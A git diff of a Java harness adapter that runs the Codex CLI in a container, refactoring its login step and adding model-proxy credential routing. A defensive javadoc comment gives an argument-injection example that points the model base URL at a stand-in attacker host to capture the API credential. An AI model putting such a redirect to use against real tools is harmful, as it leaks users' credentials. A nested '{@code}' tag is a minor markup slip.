@@ -3,6 +3,7 @@ package dev.codespire.harness.codex;
 import com.fasterxml.jackson.core.JsonProcessingException;
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
+import dev.codespire.harness.CredentialRoute;
 import dev.codespire.harness.EnvironmentPolicy;
 import dev.codespire.harness.FailureCause;
 import dev.codespire.harness.HarnessAdapter;
@@ -27,7 +28,7 @@ import java.util.Optional;
  *
  * <p>Auth is an API key or a subscription credential the operator registered (ADR-031); this adapter
  * only places what it is given into the child environment. It never logs it and never puts it in
- * argv, which is world-readable through {@code /proc/<pid>/cmdline} and echoed by
+ * argv, which is world-readable through {@code {@code /proc/PID/cmdline}} and echoed by
  * {@code docker inspect}.
  *
  * <p><b>Everything below was measured against the real binary, not read from documentation.</b> The
@@ -47,26 +48,7 @@ public final class CodexAdapter implements HarnessAdapter {
     private static final int MAX_SUMMARY_CHARS = 2_000;
 
     /** What this arm sets itself. A credential of the same name is a collision, not an override. */
-    private static final Map<String, String> OWN_SETTINGS = Map.of("CODEX_QUIET_MODE", "1");
-
-    /** What the Codex process reads its key from. Vendor knowledge, and this arm's alone. */
-    private static final String API_KEY_VARIABLE = "OPENAI_API_KEY";
-
-    /**
-     * Where the sign-in file waits for the login step to write it (M3.5 part F). This arm's own name: the
-     * script below reads it once, writes the file Codex reads, and unsets it before Codex starts.
-     */
-    private static final String SIGN_IN_VARIABLE = "CODEX_SIGN_IN_FILE";
-
-    /**
-     * The exit code the login step uses when it cannot authenticate, so a run that never reached
-     * the model is not reported as one the model failed to answer.
-     *
-     * <p>Chosen outside sysexits (64-78), outside the shell's reserved codes (126-165), and outside
-     * what codex itself returns (1 for an error, 101 for a panic), so it cannot be confused with a
-     * code the harness produced after login succeeded.
-     */
-    private static final int LOGIN_FAILED = 120;
+    static final Map<String, String> OWN_SETTINGS = Map.of("CODEX_QUIET_MODE", "1");
 
     /**
      * Codex's calls a run never needs, switched off for every run. Measured live on the dev stack on 2026-11-01 (design
@@ -113,49 +95,52 @@ public final class CodexAdapter implements HarnessAdapter {
      * {@code -c model_providers.openai.base_url=http://attacker.example/v1} redirects the model call
      * and the credential with it, with no shell involved (CWE-88). An end-of-options {@code --}
      * would also close that; stdin closes it and keeps the item's text out of
-     * {@code /proc/<pid>/cmdline} and {@code docker inspect} as well.
+     * {@code {@code /proc/PID/cmdline}} and {@code docker inspect} as well.
      */
     @Override
     public PromptDelivery promptDelivery() {
         return PromptDelivery.STDIN;
     }
 
+    /**
+     * Every flag verified present in `codex exec --help`. Two things the documentation gets
+     * wrong and an earlier draft of the plan asserted anyway: --ask-for-approval does not
+     * exist, and the sandbox mode cannot be workspace-write.
+     *
+     * Codex's Linux sandbox is BUBBLEWRAP (it vendors bwrap), and Docker's default seccomp
+     * profile refuses the user namespace bwrap needs. Making it work would require
+     * seccomp=unconfined on the container — weakening the OUTER boundary to gain an inner one.
+     * And Codex does not fail at startup when its sandbox cannot initialize, so leaving
+     * workspace-write set would mean believing in two boundaries while having one.
+     *
+     * The container is the boundary (ADR-039, RUN-TOPOLOGY §1).
+     *
+     * The trailing "-" is the prompt position, explicitly reading stdin. It is not the prompt.
+     *
+     * THE LOGIN STEP IS NOT DECORATION. codex-cli 0.146.0 does not read OPENAI_API_KEY: with
+     * the variable set and no `~/.codex/auth.json`, it exits 1 immediately printing
+     * "Error: No such file or directory (os error 2)" and no NDJSON at all — measured in the
+     * reference image on 2026-09-10, after every run of the first live dispatch died in 31
+     * seconds and was reported as MODEL_UNAVAILABLE. `codex login --with-api-key` is what
+     * writes that file, and it is what OpenAI's own documentation prescribes for programmatic
+     * use (docs/factory/EXECUTION-LAYER.md quotes it). The design knew; the code did not do it.
+     *
+     * The key crosses on a PIPE from printenv and is never interpolated into the script: argv
+     * is world-readable through {@code /proc/PID/cmdline} and echoed by docker inspect.
+     *
+     * A shell, because `--with-api-key` reads the key from stdin and there is no flag or
+     * variable that avoids the pipe. It is the ONLY shell in this path, `exec` replaces it so
+     * nothing lingers to interpret anything, and the two interpolations are quoted and refused
+     * if they could close the quote. The prompt still arrives on the harness's stdin, which the
+     * entrypoint redirects into the whole command; the login reads its own stdin from the pipe.
+     */
     @Override
     public List<String> command(HarnessInvocation invocation) {
-        // Every flag verified present in `codex exec --help`. Two things the documentation gets
-        // wrong and an earlier draft of the plan asserted anyway: --ask-for-approval does not
-        // exist, and the sandbox mode cannot be workspace-write.
-        //
-        // Codex's Linux sandbox is BUBBLEWRAP (it vendors bwrap), and Docker's default seccomp
-        // profile refuses the user namespace bwrap needs. Making it work would require
-        // seccomp=unconfined on the container — weakening the OUTER boundary to gain an inner one.
-        // And Codex does not fail at startup when its sandbox cannot initialize, so leaving
-        // workspace-write set would mean believing in two boundaries while having one.
-        //
-        // The container is the boundary (ADR-039, RUN-TOPOLOGY §1).
-        //
-        // The trailing "-" is the prompt position, explicitly reading stdin. It is not the prompt.
-        //
-        // THE LOGIN STEP IS NOT DECORATION. codex-cli 0.146.0 does not read OPENAI_API_KEY: with
-        // the variable set and no `~/.codex/auth.json`, it exits 1 immediately printing
-        // "Error: No such file or directory (os error 2)" and no NDJSON at all — measured in the
-        // reference image on 2026-09-10, after every run of the first live dispatch died in 31
-        // seconds and was reported as MODEL_UNAVAILABLE. `codex login --with-api-key` is what
-        // writes that file, and it is what OpenAI's own documentation prescribes for programmatic
-        // use (docs/factory/EXECUTION-LAYER.md quotes it). The design knew; the code did not do it.
-        //
-        // The key crosses on a PIPE from printenv and is never interpolated into the script: argv
-        // is world-readable through /proc/<pid>/cmdline and echoed by docker inspect.
-        //
-        // A shell, because `--with-api-key` reads the key from stdin and there is no flag or
-        // variable that avoids the pipe. It is the ONLY shell in this path, `exec` replaces it so
-        // nothing lingers to interpret anything, and the two interpolations are quoted and refused
-        // if they could close the quote. The prompt still arrives on the harness's stdin, which the
-        // entrypoint redirects into the whole command; the login reads its own stdin from the pipe.
-        String script = login(invocation)
+        String script = CodexLogin.script(invocation)
                 + "exec codex exec --json --sandbox danger-full-access --skip-git-repo-check"
                 + " --model " + quoted(invocation.model(), "model")
                 + effort(invocation.reasoningEffort())
+                + CodexModelProxy.settings(invocation)
                 + extraCallsOff(invocation)
                 + projectGuidance(invocation)
                 + " -C " + quoted(invocation.workspacePath(), "workspace path")
@@ -163,30 +148,9 @@ public final class CodexAdapter implements HarnessAdapter {
         return List.of("sh", "-c", script);
     }
 
-    /**
-     * How this run signs Codex in: a key piped into {@code --with-api-key}, or a sign-in file written
-     * where Codex reads one.
-     *
-     * <p>The file is written because no login flag takes it. {@code --with-access-token} was the plan and
-     * refuses a ChatGPT access token (measured 2026-09-25, codex-cli 0.156.1: design §5.3); the file,
-     * with its refresh token emptied by the orchestrator, is accepted and runs. Written owner-only
-     * ({@code umask 077}), and the variable that carried it is unset before Codex starts, so the process
-     * that runs ticket text does not also inherit it. The agent can still read the file, as it can read
-     * a key today — what it cannot hold is a refresh token, because none was ever sent.
-     */
-    private static String login(HarnessInvocation invocation) {
-        if (invocation.credentials().containsKey(HarnessInvocation.SIGN_IN)) {
-            return "mkdir -p \"$HOME/.codex\" && (umask 077 && printenv " + SIGN_IN_VARIABLE
-                    + " > \"$HOME/.codex/auth.json\") || exit " + LOGIN_FAILED + "; "
-                    + "unset " + SIGN_IN_VARIABLE + "; ";
-        }
-        return "printenv " + API_KEY_VARIABLE + " | codex login --with-api-key >/dev/null"
-                + " || exit " + LOGIN_FAILED + "; ";
-    }
-
     /** The flags that switch off what a run never needs; a seat run also switches off apps. */
     private static String extraCallsOff(HarnessInvocation invocation) {
-        return invocation.credentials().containsKey(HarnessInvocation.SIGN_IN) ? NO_EXTRA_CALLS + NO_APPS : NO_EXTRA_CALLS;
+        return CodexLogin.isSeat(invocation) ? NO_EXTRA_CALLS + NO_APPS : NO_EXTRA_CALLS;
     }
 
     /** Nothing for a run that follows the repository's guidance; the zero budget for one that must not. */
@@ -213,7 +177,7 @@ public final class CodexAdapter implements HarnessAdapter {
      * metacharacter in it, the path from the run unit's own spec — so this is the second lock on a
      * door that is already shut, placed here because that is where the shell is.
      */
-    private static String quoted(String value, String what) {
+    static String quoted(String value, String what) {
         if (value == null || value.isBlank()) {
             throw new IllegalArgumentException(what + " is required");
         }
@@ -234,16 +198,25 @@ public final class CodexAdapter implements HarnessAdapter {
         // The worker hands the key over under the SPI's neutral name; this arm knows what its own
         // process reads. Everything else in the map still goes through the policy, which is where
         // a name that would relocate the config or hijack the child is refused.
+        if (invocation.credentialProxied()) {
+            return CodexModelProxy.environment(invocation);
+        }
         Map<String, String> credentials = new java.util.LinkedHashMap<>(invocation.credentials());
         String apiKey = credentials.remove(HarnessInvocation.CREDENTIAL);
         if (apiKey != null) {
-            credentials.put(API_KEY_VARIABLE, apiKey);
+            credentials.put(CodexLogin.API_KEY_VARIABLE, apiKey);
         }
         String signIn = credentials.remove(HarnessInvocation.SIGN_IN);
         if (signIn != null) {
-            credentials.put(SIGN_IN_VARIABLE, signIn);
+            credentials.put(CodexLogin.SIGN_IN_VARIABLE, signIn);
         }
         return EnvironmentPolicy.merge(credentials, OWN_SETTINGS);
+    }
+
+    /** The model proxy's route for a proxied run, per payment: {@link CodexModelProxy#route}. */
+    @Override
+    public Optional<CredentialRoute> credentialRoute(HarnessInvocation invocation) {
+        return CodexModelProxy.route(invocation);
     }
 
     /**
@@ -409,7 +382,7 @@ public final class CodexAdapter implements HarnessAdapter {
         if (exitCode == 0) {
             return TerminalOutcome.success("codex exec completed");
         }
-        if (exitCode == LOGIN_FAILED) {
+        if (exitCode == CodexLogin.LOGIN_FAILED) {
             // Distinct from every other failure and from "the model said nothing": the harness
             // never started, so nothing about the model or the work item is implicated. The first
             // live dispatch spent its diagnosis on the model because this case had no name.
